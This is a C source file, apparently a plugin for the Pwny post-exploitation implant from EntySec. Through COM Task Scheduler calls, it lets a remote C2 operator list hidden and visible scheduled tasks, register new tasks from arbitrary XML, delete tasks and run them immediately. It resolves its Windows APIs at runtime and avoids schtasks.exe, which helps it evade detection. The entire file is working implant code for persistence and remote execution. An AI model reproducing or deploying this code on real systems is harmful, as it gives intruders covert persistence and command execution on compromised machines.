/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Scheduled Tasks COT plugin — enumerate, create, and delete
 * scheduled tasks via the COM Task Scheduler 2.0 API.
 *
 * Uses ITaskService / ITaskFolder / IRegisteredTaskCollection
 * COM interfaces with explicit vtable navigation.
 *
 * No schtasks.exe — everything goes through COM.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>
#include <oleauto.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

#define SCHTASK_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define SCHTASK_CREATE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define SCHTASK_DELETE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 2)

#define SCHTASK_RUN \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 3)

/* TLV types */
#define TLV_TYPE_ST_NAME   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_ST_PATH   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_ST_STATE  TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE)
#define TLV_TYPE_ST_CMD    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
#define TLV_TYPE_ST_ARGS   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 3)
#define TLV_TYPE_ST_XML    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 4)
#define TLV_TYPE_ST_GROUP  TLV_TYPE_CUSTOM(TLV_TYPE_GROUP,  TAB_BASE, API_TYPE)
#define TLV_TYPE_ST_FOLDER TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 5)

/* ------------------------------------------------------------------ */
/* Win32 function pointer types                                        */
/* ------------------------------------------------------------------ */

typedef HRESULT (WINAPI *fn_CoInitializeEx)(LPVOID, DWORD);
typedef HRESULT (WINAPI *fn_CoCreateInstance)(REFCLSID, LPUNKNOWN, DWORD,
                                               REFIID, LPVOID *);
typedef void    (WINAPI *fn_CoUninitialize)(void);
typedef BSTR    (WINAPI *fn_SysAllocString)(const OLECHAR *);
typedef void    (WINAPI *fn_SysFreeString)(BSTR);
typedef UINT    (WINAPI *fn_SysStringLen)(BSTR);
typedef void    (WINAPI *fn_VariantInit)(VARIANTARG *);
typedef HRESULT (WINAPI *fn_VariantClear)(VARIANTARG *);
typedef int     (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWCH, int,
                                                  LPSTR, int, LPCCH, LPBOOL);

static struct
{
    fn_CoInitializeEx      pCoInitializeEx;
    fn_CoCreateInstance    pCoCreateInstance;
    fn_CoUninitialize      pCoUninitialize;
    fn_SysAllocString      pSysAllocString;
    fn_SysFreeString       pSysFreeString;
    fn_SysStringLen        pSysStringLen;
    fn_VariantInit         pVariantInit;
    fn_VariantClear        pVariantClear;
    fn_WideCharToMultiByte pWideCharToMultiByte;
} w;

/* ------------------------------------------------------------------ */
/* GUIDs                                                               */
/* ------------------------------------------------------------------ */

/* CLSID_TaskScheduler = {0F87369F-A4E5-4CFC-BD3E-73E6154572DD} */
static const GUID CLSID_TaskScheduler = {
    0x0F87369F, 0xA4E5, 0x4CFC,
    {0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD}
};

/* IID_ITaskService = {2FABA4C7-4DA9-4013-9697-20CC3FD40F85} */
static const GUID IID_ITaskService = {
    0x2FABA4C7, 0x4DA9, 0x4013,
    {0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85}
};

/* ------------------------------------------------------------------ */
/* COM vtable definitions for Task Scheduler 2.0                       */
/*                                                                     */
/* All interfaces inherit IDispatch (7 base slots: 0-6).               */
/* Custom methods start at slot 7.                                     */
/* ------------------------------------------------------------------ */

/*
 * ITaskService vtable (custom methods from slot 7):
 *   7: GetFolder(BSTR path, ITaskFolder** ppFolder)
 *   8: GetRunningTasks(LONG flags, IRunningTaskCollection**)
 *   9: NewTask(DWORD flags, ITaskDefinition**)
 *  10: Connect(VARIANT server, VARIANT user, VARIANT domain, VARIANT password)
 *  11: get_Connected(VARIANT_BOOL*)
 *  12: get_TargetServer(BSTR*)
 *  13: get_ConnectedUser(BSTR*)
 *  14: get_ConnectedDomain(BSTR*)
 *  15: get_HighestVersion(DWORD*)
 */
typedef struct
{
    void *base[7];  /* IUnknown + IDispatch */
    HRESULT (STDMETHODCALLTYPE *GetFolder)(void *This, BSTR path,
                                            void **ppFolder);
    void *slot_8;
    void *slot_9;
    HRESULT (STDMETHODCALLTYPE *Connect)(void *This,
                                          VARIANT server, VARIANT user,
                                          VARIANT domain, VARIANT password);
    void *rest[5];
} ITaskServiceVtbl_COT;

typedef struct { ITaskServiceVtbl_COT *lpVtbl; } ITaskService_COT;

/*
 * ITaskFolder vtable (custom methods from slot 7):
 *   7:  get_Name(BSTR*)
 *   8:  get_Path(BSTR*)
 *   9:  GetFolder(BSTR, ITaskFolder**)
 *  10:  GetFolders(LONG, ITaskFolderCollection**)
 *  11:  CreateFolder(BSTR, VARIANT, ITaskFolder**)
 *  12:  DeleteFolder(BSTR, LONG)
 *  13:  GetTask(BSTR, IRegisteredTask**)
 *  14:  GetTasks(LONG, IRegisteredTaskCollection**)
 *  15:  DeleteTask(BSTR, LONG)
 *  16:  RegisterTask(BSTR, BSTR, LONG, VARIANT, VARIANT, LONG, VARIANT,
 *                     IRegisteredTask**)
 *  17:  RegisterTaskDefinition(...)
 */
typedef struct
{
    void *base[7];
    HRESULT (STDMETHODCALLTYPE *get_Name)(void *This, BSTR *pName);
    HRESULT (STDMETHODCALLTYPE *get_Path)(void *This, BSTR *pPath);
    HRESULT (STDMETHODCALLTYPE *GetFolder)(void *This, BSTR name,
                                            void **ppFolder);
    HRESULT (STDMETHODCALLTYPE *GetFolders)(void *This, LONG flags,
                                             void **ppFolders);
    HRESULT (STDMETHODCALLTYPE *CreateFolder)(void *This, BSTR subFolderName,
                                               VARIANT sddl, void **ppFolder);
    HRESULT (STDMETHODCALLTYPE *DeleteFolder)(void *This, BSTR subFolderName,
                                               LONG flags);
    HRESULT (STDMETHODCALLTYPE *GetTask)(void *This, BSTR path,
                                          void **ppTask);
    HRESULT (STDMETHODCALLTYPE *GetTasks)(void *This, LONG flags,
                                           void **ppTasks);
    HRESULT (STDMETHODCALLTYPE *DeleteTask)(void *This, BSTR name, LONG flags);
    HRESULT (STDMETHODCALLTYPE *RegisterTask)(void *This,
                                               BSTR path, BSTR xmlText,
                                               LONG flags,
                                               VARIANT userId, VARIANT password,
                                               LONG logonType,
                                               VARIANT sddl,
                                               void **ppTask);
    void *rest[10];
} ITaskFolderVtbl_COT;

typedef struct { ITaskFolderVtbl_COT *lpVtbl; } ITaskFolder_COT;

/*
 * IRegisteredTaskCollection vtable (from slot 7):
 *   7:  get_Count(LONG*)
 *   8:  get_Item(VARIANT index, IRegisteredTask**)
 *   9:  get__NewEnum(IUnknown**)
 */
typedef struct
{
    void *base[7];
    HRESULT (STDMETHODCALLTYPE *get_Count)(void *This, LONG *pCount);
    HRESULT (STDMETHODCALLTYPE *get_Item)(void *This, VARIANT index,
                                           void **ppTask);
    void *rest[5];
} IRegisteredTaskCollectionVtbl_COT;

typedef struct { IRegisteredTaskCollectionVtbl_COT *lpVtbl; } IRegisteredTaskCollection_COT;

/*
 * IRegisteredTask vtable (from slot 7):
 *   7:  get_Name(BSTR*)
 *   8:  get_Path(BSTR*)
 *   9:  get_State(LONG*)   -- TASK_STATE enum
 *  10:  get_Enabled(VARIANT_BOOL*)
 *  11:  Run(VARIANT, IRunningTask**)
 *  12:  RunEx(...)
 *  13:  GetInstances(LONG, IRunningTaskCollection**)
 *  14:  get_LastRunTime(DATE*)
 *  15:  get_LastTaskResult(LONG*)
 *  16:  get_NumberOfMissedRuns(LONG*)
 *  17:  get_NextRunTime(DATE*)
 *  18:  get_Definition(ITaskDefinition**)
 *  19:  get_Xml(BSTR*)
 */
typedef struct
{
    void *base[7];
    HRESULT (STDMETHODCALLTYPE *get_Name)(void *This, BSTR *pName);
    HRESULT (STDMETHODCALLTYPE *get_Path)(void *This, BSTR *pPath);
    HRESULT (STDMETHODCALLTYPE *get_State)(void *This, LONG *pState);
    HRESULT (STDMETHODCALLTYPE *get_Enabled)(void *This, VARIANT_BOOL *pEnabled);
    HRESULT (STDMETHODCALLTYPE *Run)(void *This, VARIANT params,
                                      void **ppRunningTask);
    void *rest[20];
} IRegisteredTaskVtbl_COT;

typedef struct { IRegisteredTaskVtbl_COT *lpVtbl; } IRegisteredTask_COT;

/* ------------------------------------------------------------------ */
/* Helper: BSTR to UTF-8                                               */
/* ------------------------------------------------------------------ */

static int bstr_to_utf8(BSTR bstr, char *buf, int bufsz)
{
    int len;
    if (bstr == NULL)
    {
        buf[0] = '\0';
        return 0;
    }

    len = w.pWideCharToMultiByte(CP_UTF8, 0, bstr, -1, buf, bufsz,
                                  NULL, NULL);
    if (len <= 0)
    {
        buf[0] = '\0';
        return 0;
    }
    return len - 1;
}

/* ------------------------------------------------------------------ */
/* Task state names                                                    */
/* ------------------------------------------------------------------ */

#define TASK_STATE_UNKNOWN  0
#define TASK_STATE_DISABLED 1
#define TASK_STATE_QUEUED   2
#define TASK_STATE_READY    3
#define TASK_STATE_RUNNING  4

/* ------------------------------------------------------------------ */
/* List tasks handler                                                  */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *schtask_list(c2_t *c2)
{
    ITaskService_COT *pService = NULL;
    ITaskFolder_COT *pFolder = NULL;
    IRegisteredTaskCollection_COT *pTasks = NULL;
    HRESULT hr;
    VARIANT vEmpty;
    BSTR bstrFolder;
    char folder_path[256];
    LONG count, i;
    tlv_pkt_t *result;

    w.pCoInitializeEx(NULL, COINIT_MULTITHREADED);

    hr = w.pCoCreateInstance(&CLSID_TaskScheduler, NULL,
                              CLSCTX_INPROC_SERVER,
                              &IID_ITaskService, (void **)&pService);
    if (FAILED(hr) || pService == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pVariantInit(&vEmpty);
    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr))
    {
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Get folder (default: root "\") */
    if (tlv_pkt_get_string(c2->request, TLV_TYPE_ST_FOLDER, folder_path) < 0)
    {
        folder_path[0] = '\\';
        folder_path[1] = '\0';
    }

    {
        wchar_t wfolder[256];
        int wlen = 256;
        for (i = 0; folder_path[i] && i < 255; i++)
            wfolder[i] = (wchar_t)folder_path[i];
        wfolder[i] = L'\0';
        bstrFolder = w.pSysAllocString(wfolder);
    }

    hr = pService->lpVtbl->GetFolder(pService, bstrFolder,
                                      (void **)&pFolder);
    w.pSysFreeString(bstrFolder);

    if (FAILED(hr) || pFolder == NULL)
    {
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Get the task collection (flag 1 = include hidden tasks) */
    hr = pFolder->lpVtbl->GetTasks(pFolder, 1, (void **)&pTasks);
    if (FAILED(hr) || pTasks == NULL)
    {
        ((IUnknown *)pFolder)->lpVtbl->Release((IUnknown *)pFolder);
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pTasks->lpVtbl->get_Count(pTasks, &count);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 1; i <= count; i++)
    {
        IRegisteredTask_COT *pTask = NULL;
        VARIANT vIndex;
        BSTR bstrName = NULL;
        BSTR bstrPath = NULL;
        LONG state = 0;
        char name[512];
        char path[512];
        tlv_pkt_t *entry;

        w.pVariantInit(&vIndex);
        V_VT(&vIndex) = VT_I4;
        V_I4(&vIndex) = i;

        hr = pTasks->lpVtbl->get_Item(pTasks, vIndex, (void **)&pTask);
        if (FAILED(hr) || pTask == NULL)
            continue;

        pTask->lpVtbl->get_Name(pTask, &bstrName);
        pTask->lpVtbl->get_Path(pTask, &bstrPath);
        pTask->lpVtbl->get_State(pTask, &state);

        bstr_to_utf8(bstrName, name, sizeof(name));
        bstr_to_utf8(bstrPath, path, sizeof(path));

        if (bstrName) w.pSysFreeString(bstrName);
        if (bstrPath) w.pSysFreeString(bstrPath);

        entry = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_string(entry, TLV_TYPE_ST_NAME, name);
        tlv_pkt_add_string(entry, TLV_TYPE_ST_PATH, path);
        tlv_pkt_add_u32(entry, TLV_TYPE_ST_STATE, (int)state);

        tlv_pkt_add_tlv(result, TLV_TYPE_ST_GROUP, entry);
        tlv_pkt_destroy(entry);

        ((IUnknown *)pTask)->lpVtbl->Release((IUnknown *)pTask);
    }

    ((IUnknown *)pTasks)->lpVtbl->Release((IUnknown *)pTasks);
    ((IUnknown *)pFolder)->lpVtbl->Release((IUnknown *)pFolder);
    ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);

    return result;
}

/* ------------------------------------------------------------------ */
/* Create task via XML definition                                      */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *schtask_create(c2_t *c2)
{
    ITaskService_COT *pService = NULL;
    ITaskFolder_COT *pFolder = NULL;
    IRegisteredTask_COT *pTask = NULL;
    HRESULT hr;
    VARIANT vEmpty;
    BSTR bstrRoot;
    BSTR bstrName;
    BSTR bstrXml;
    char name[256];
    char xml[32768];
    wchar_t wname[256];
    wchar_t wxml[32768];
    int i;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_ST_NAME, name) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_ST_XML, xml) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    /* Convert to wide strings */
    for (i = 0; name[i] && i < 255; i++) wname[i] = (wchar_t)name[i];
    wname[i] = L'\0';
    for (i = 0; xml[i] && i < 32767; i++) wxml[i] = (wchar_t)xml[i];
    wxml[i] = L'\0';

    w.pCoInitializeEx(NULL, COINIT_MULTITHREADED);

    hr = w.pCoCreateInstance(&CLSID_TaskScheduler, NULL,
                              CLSCTX_INPROC_SERVER,
                              &IID_ITaskService, (void **)&pService);
    if (FAILED(hr) || pService == NULL)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    w.pVariantInit(&vEmpty);
    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr))
    {
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    bstrRoot = w.pSysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, bstrRoot, (void **)&pFolder);
    w.pSysFreeString(bstrRoot);

    if (FAILED(hr) || pFolder == NULL)
    {
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* RegisterTask with XML:
     * flags: TASK_CREATE_OR_UPDATE = 6
     * logonType: TASK_LOGON_INTERACTIVE_TOKEN = 3
     */
    bstrName = w.pSysAllocString(wname);
    bstrXml = w.pSysAllocString(wxml);

    hr = pFolder->lpVtbl->RegisterTask(pFolder, bstrName, bstrXml,
                                         6, /* TASK_CREATE_OR_UPDATE */
                                         vEmpty, vEmpty,
                                         3, /* TASK_LOGON_INTERACTIVE_TOKEN */
                                         vEmpty,
                                         (void **)&pTask);

    w.pSysFreeString(bstrName);
    w.pSysFreeString(bstrXml);

    if (FAILED(hr) || pTask == NULL)
    {
        ((IUnknown *)pFolder)->lpVtbl->Release((IUnknown *)pFolder);
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    ((IUnknown *)pTask)->lpVtbl->Release((IUnknown *)pTask);
    ((IUnknown *)pFolder)->lpVtbl->Release((IUnknown *)pFolder);
    ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* Delete task                                                         */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *schtask_delete(c2_t *c2)
{
    ITaskService_COT *pService = NULL;
    ITaskFolder_COT *pFolder = NULL;
    HRESULT hr;
    VARIANT vEmpty;
    BSTR bstrRoot;
    BSTR bstrName;
    char name[256];
    wchar_t wname[256];
    int i;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_ST_NAME, name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    for (i = 0; name[i] && i < 255; i++) wname[i] = (wchar_t)name[i];
    wname[i] = L'\0';

    w.pCoInitializeEx(NULL, COINIT_MULTITHREADED);

    hr = w.pCoCreateInstance(&CLSID_TaskScheduler, NULL,
                              CLSCTX_INPROC_SERVER,
                              &IID_ITaskService, (void **)&pService);
    if (FAILED(hr) || pService == NULL)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    w.pVariantInit(&vEmpty);
    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr))
    {
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    bstrRoot = w.pSysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, bstrRoot, (void **)&pFolder);
    w.pSysFreeString(bstrRoot);

    if (FAILED(hr) || pFolder == NULL)
    {
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    bstrName = w.pSysAllocString(wname);
    hr = pFolder->lpVtbl->DeleteTask(pFolder, bstrName, 0);
    w.pSysFreeString(bstrName);

    ((IUnknown *)pFolder)->lpVtbl->Release((IUnknown *)pFolder);
    ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);

    if (FAILED(hr))
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* Run task immediately                                                */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *schtask_run(c2_t *c2)
{
    ITaskService_COT *pService = NULL;
    ITaskFolder_COT *pFolder = NULL;
    IRegisteredTask_COT *pTask = NULL;
    HRESULT hr;
    VARIANT vEmpty;
    BSTR bstrRoot;
    BSTR bstrName;
    char name[256];
    wchar_t wname[256];
    int i;
    void *pRunning = NULL;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_ST_NAME, name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    for (i = 0; name[i] && i < 255; i++) wname[i] = (wchar_t)name[i];
    wname[i] = L'\0';

    w.pCoInitializeEx(NULL, COINIT_MULTITHREADED);

    hr = w.pCoCreateInstance(&CLSID_TaskScheduler, NULL,
                              CLSCTX_INPROC_SERVER,
                              &IID_ITaskService, (void **)&pService);
    if (FAILED(hr) || pService == NULL)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    w.pVariantInit(&vEmpty);
    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr))
    {
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    bstrRoot = w.pSysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, bstrRoot, (void **)&pFolder);
    w.pSysFreeString(bstrRoot);

    if (FAILED(hr) || pFolder == NULL)
    {
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    bstrName = w.pSysAllocString(wname);
    hr = pFolder->lpVtbl->GetTask(pFolder, bstrName, (void **)&pTask);
    w.pSysFreeString(bstrName);

    if (FAILED(hr) || pTask == NULL)
    {
        ((IUnknown *)pFolder)->lpVtbl->Release((IUnknown *)pFolder);
        ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hr = pTask->lpVtbl->Run(pTask, vEmpty, &pRunning);

    if (pRunning)
        ((IUnknown *)pRunning)->lpVtbl->Release((IUnknown *)pRunning);
    ((IUnknown *)pTask)->lpVtbl->Release((IUnknown *)pTask);
    ((IUnknown *)pFolder)->lpVtbl->Release((IUnknown *)pFolder);
    ((IUnknown *)pService)->lpVtbl->Release((IUnknown *)pService);

    if (FAILED(hr))
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    w.pCoInitializeEx      = (fn_CoInitializeEx)cot_resolve("ole32.dll",
                                                             "CoInitializeEx");
    w.pCoCreateInstance    = (fn_CoCreateInstance)cot_resolve("ole32.dll",
                                                               "CoCreateInstance");
    w.pCoUninitialize      = (fn_CoUninitialize)cot_resolve("ole32.dll",
                                                              "CoUninitialize");
    w.pSysAllocString      = (fn_SysAllocString)cot_resolve("oleaut32.dll",
                                                              "SysAllocString");
    w.pSysFreeString       = (fn_SysFreeString)cot_resolve("oleaut32.dll",
                                                             "SysFreeString");
    w.pSysStringLen        = (fn_SysStringLen)cot_resolve("oleaut32.dll",
                                                           "SysStringLen");
    w.pVariantInit         = (fn_VariantInit)cot_resolve("oleaut32.dll",
                                                          "VariantInit");
    w.pVariantClear        = (fn_VariantClear)cot_resolve("oleaut32.dll",
                                                           "VariantClear");
    w.pWideCharToMultiByte = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll",
                                                                  "WideCharToMultiByte");

    api_call_register(api_calls, SCHTASK_LIST,   (api_t)schtask_list);
    api_call_register(api_calls, SCHTASK_CREATE, (api_t)schtask_create);
    api_call_register(api_calls, SCHTASK_DELETE, (api_t)schtask_delete);
    api_call_register(api_calls, SCHTASK_RUN,    (api_t)schtask_run);
}

#endif
